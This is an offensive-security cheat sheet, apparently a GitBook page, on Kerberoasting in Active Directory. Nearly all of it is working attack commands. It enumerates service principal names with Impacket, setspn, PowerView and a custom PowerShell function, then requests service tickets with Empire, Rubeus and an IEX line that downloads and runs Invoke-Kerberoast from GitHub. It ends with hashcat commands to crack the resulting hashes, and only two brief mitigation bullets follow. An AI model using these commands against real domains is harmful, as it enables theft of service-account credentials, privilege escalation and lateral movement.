---
description: https://attack.mitre.org/techniques/T1558/003/
---

# Kerberoasting

**ATT\&CK ID:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

**Permissions Required:** <mark style="color:green;">**Valid Domain Account**</mark> | <mark style="color:orange;">**Ability to sniff domain traffic**</mark>

**Description**

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plain text credentials.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

[\[Source\]](https://attack.mitre.org/techniques/T1558/003/)

## Enumeration Techniques - Linux

**Python - Impacket**

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

## Enumeration Techniques - Windows

**CMD**

<pre class="language-bash"><code class="lang-bash"><strong># Gets all SPNs, Includes machine account SPNs
</strong><strong>setspn -T [Domain] -Q */*
</strong></code></pre>

**Powerview**

```powershell
Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName
```

**PowerShell Native**

<pre class="language-powershell"><code class="lang-powershell">function Get-SpnKerbType {
    param (
        [string]$LDAPFilter = "(&#x26;(objectCategory=person)(objectClass=user)(!(sAMAccountName=krbtgt))(servicePrincipalName=*))",
        [string]$Domain = ""
    )

    Add-Type -AssemblyName System.IdentityModel

    $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher([System.DirectoryServices.DirectoryEntry]::new($Domain), $LDAPFilter)
    $ADSearcher.PropertiesToLoad.AddRange(@("name", "servicePrincipalName"))

    $ADSearcher.FindAll() | ForEach-Object {
        $entry = $_.GetDirectoryEntry()
        foreach ($SPN in $entry.Properties["servicePrincipalName"]) {
            try {
                $kerbTicket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                Start-Sleep -Milliseconds 50

                $klistOutput = klist | Out-String
                $ticketFound = $false
                $encryptionType = $null
                foreach ($line in $klistOutput -split "\r?\n") {
                    if ($line -match "Server: $SPN\s*@") {
                        $ticketFound = $true
                        continue
                    }
                    if ($ticketFound -and $line -match "KerbTicket Encryption Type: (.*)") {
                        $encryptionType = $matches[1].Trim()
                        break
                    }
                }

                $etypeDescription = if ($encryptionType) { $encryptionType } else { "Unknown" }

                [PSCustomObject]@{
                    UserName       = $entry.Properties["name"].Value
                    SPN            = $SPN
                    EncryptionType = $etypeDescription
                }
            }
            catch {
                Write-Warning "Error requesting Kerberos ticket for SPN '$SPN': $_"
            }
        }
    } | Format-Table -AutoSize
}
<strong>
</strong>Get-SpnKerbType 
</code></pre>

## Exploit Techniques - Linux

### Empire

```bash
# PowerShell
powershell/credentials/invoke_kerberoast

# C#
csharp/SharpSploit.Enumeration/Kerberoast
```

![](<../../../../.gitbook/assets/image (157) (2).png>)

### Impacket

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

![](<../../../../.gitbook/assets/image (352).png>)

## Exploit Techniques - Windows&#x20;

**Invoke-Kerberoast (PowerSploit)**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast | FL
</strong></code></pre>

![](<../../../../.gitbook/assets/invoke-kerbroast (1).png>)

### Rubeus

**URL (Binary):** [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

**URL (PowerShell):** [https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1)&#x20;

```python
# Kerberoast all users in Domain and output to file
.\Rubeus.exe kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt

# Kerberoast all users in alternative Domain
.\Rubeus.exe kerberoast /nowrap /domain:[Domain]

# All Users in OU
.\Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local /nowrap

# Specific users
.\Rubeus.exe kerberoast /user:[User] /nowrap

# List statistics about found Kerberoastable accounts (Quiet)
.\Rubeus.exe kerberoast /stats
```

![](<../../../../.gitbook/assets/rubeus-kerberoast (1).png>)

## Hash Cracking

```bash
hashcat -m 13100 -a 0 -O hashes.txt rockyou.txt -r rules.rule

etype           Value        Hashcat mode
AES128           17            19600
AES256           18            19700
RC4              23            13100
```

## Mitigation

* Ensure service account passwords are longer than 25 characters
* Make use of Group Service Managed Accounts (GMSA) where possible
